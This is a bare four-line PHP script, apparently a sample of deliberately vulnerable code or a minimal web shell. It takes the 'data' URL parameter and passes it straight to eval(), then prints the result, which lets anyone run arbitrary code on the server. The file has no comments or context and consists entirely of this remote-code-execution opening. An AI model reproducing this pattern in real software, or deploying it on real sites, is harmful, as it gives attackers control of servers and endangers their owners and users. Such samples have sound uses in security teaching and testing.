<?php
$data=$_GET['data'];
eval("\$ret=$data;");
echo $ret;